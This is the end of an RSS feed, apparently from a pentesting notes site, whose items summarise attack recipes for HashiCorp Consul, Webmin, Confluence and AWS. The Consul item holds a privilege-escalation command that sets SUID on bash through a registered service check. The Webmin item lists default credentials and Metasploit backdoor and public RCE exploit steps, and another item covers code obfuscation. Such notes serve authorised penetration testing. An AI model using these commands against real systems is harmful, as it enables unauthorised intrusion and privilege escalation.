+      <description>Deobfuscate PHP Files with Syntax Highlighting linkAccording to the PHP Manual, you might be able to deobfuscate php files by accessing with phps extension if the &amp;ldquo;highlight_file&amp;rdquo; is used in the target website.&#xA;https://vulnerable.com/index.phps </description>
+    </item>
+    <item>
+      <title>HashiCorp Consul Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/</link>
+      <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/</guid>
+      <description>Privilege Escalation linkIf you have the ACL token (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx), you may be able to privilege escalation.&#xA;First, create a script which changes the permission of ‘bash’.&#xA;echo &amp;#39;chmod &amp;#43;s /usr/bin/bash&amp;#39; &amp;gt; /tmp/exploit.sh Then curl.&#xA;curl --header &amp;#34;X-Consul-Token: &amp;lt;ACL-TOKEN&amp;gt;&amp;#34; --request PUT -d &amp;#39;{&amp;#34;ID&amp;#34;: &amp;#34;test&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;test&amp;#34;, &amp;#34;Address&amp;#34;: &amp;#34;127.0.0.1&amp;#34;, &amp;#34;Port&amp;#34;: 80, &amp;#34;check&amp;#34;: {&amp;#34;Args&amp;#34;: [&amp;#34;/usr/bin/bash&amp;#34;, &amp;#34;/tmp/e.sh&amp;#34;], &amp;#34;interval&amp;#34;: &amp;#34;10s&amp;#34;, &amp;#34;timeout&amp;#34;: &amp;#34;1s&amp;#34;}}&amp;#39; http://127.0.0.1:8500/v1/agent/service/register KV (Key/Value) Store link # Put consul kv put --token &amp;lt;ACL-TOKEN&amp;gt; key value consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 path/to/store data </description>
+    </item>
+    <item>
+      <title>OOB (Out of Band) Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/oob-attack/</link>
+      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/oob-attack/</guid>
+      <description>Tools linkinteractsh linkOOB (Out Of Band) interaction gathering server and client library.&#xA;interactsh-client </description>
+    </item>
+    <item>
+      <title>Webmin Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/webmin-pentesting/</link>
+      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/webmin-pentesting/</guid>
+      <description>Default Credentials link admin:admin password_chagne.cgi Command Injection version=1.890 link msfconsole msf&amp;gt; use exploit/linux/http/webmin_backdoor msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; set lhost &amp;lt;local-ip&amp;gt; msf&amp;gt; run shell Remote Code Execution (RCE) version&amp;lt;2.37 linkWebmin version&amp;lt;2.37 is vulnerable to remote code execution.&#xA;Download the payload .&#xA;git clone https://github.com/MuirlandOracle/CVE-2019-15107 cd CVE-2019-15107 python3 CVE-2019-15107.py &amp;lt;target-ip&amp;gt; </description>
+    </item>
+    <item>
+      <title>Atlassian Confluence Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/atlassian-confluence-pentesting/</link>
+      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/atlassian-confluence-pentesting/</guid>
+      <description>Remote Code Execution (CVE-2022-26134) linkDownload the exploit from the repo.&#xA;python3 exploit.py -u http://&amp;lt;target-ip&amp;gt; -c whoami </description>
+    </item>
+    <item>
+      <title>AWS (Amazon Web Services) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cloud/aws-pentesting/</link>
+      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cloud/aws-pentesting/</guid>
+      <description>Amazon Resource Names (ARNs) link # Format arn:aws:&amp;lt;service&amp;gt;:&amp;lt;region&amp;gt;:&amp;lt;account_id&amp;gt;:&amp;lt;resource_type&amp;gt;/&amp;lt;resource_name&amp;gt; Identify and Access Management (IAM) link # Add credentials # This will add entries to .aws/config or .aws/credentials in user&amp;#39;s home directory. # &amp;lt;profile-name&amp;gt; is arbitrary. aws configure --profile &amp;lt;profile-name&amp;gt; # List credentials aws configure list --profile &amp;lt;profile-name&amp;gt; # Find the account id belonging to an access key (access key starts with &amp;#34;AKIA&amp;#34;) aws sts get-access-key-info --access-key-id AKIAQ31B... # Determin the username the access key you&amp;#39;re using belogns to aws sts get-caller-identity --profile &amp;lt;profile-name&amp;gt; # List all EC2 instances running in an account aws ec2 describe-instances --output text --profile &amp;lt;profile-name&amp;gt; # List all EC2 instances running in an account in a dirrerent region aws ec2 describe-instances --output text --region us-east-1 --profile &amp;lt;profile-name&amp;gt; Amazon S3 linkA public cloud storage resource available in Amazon Web Services (AWS) Simple Storage Service (S3), an object storage offering.</description>
+    </item>
+    <item>
+      <title>Code Deobfuscation</title>
+      <link>https://documentnation.github.io/docs/hdks/web/code-deobfuscation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/code-deobfuscation/</guid>
+      <description>Deobfuscation link JavaScript&#xA;JavaScript Deobfuscator Obfuscation link JavaScript&#xA;Manual Obfuscation&#xA;Access https://obfuscator.io/.&#xA;Change “String Array Encoding” to “Base64”.&#xA;Paste JavaScript code.&#xA;Click &amp;ldquo;Obfuscate&amp;rdquo;.&#xA;Try running it on https://jsconsole.com/.&#xA;Use Online Tools&#xA;JSFuck&#xA;jjencode&#xA;aaencode</description>
+    </item>
+  </channel>
+</rss>
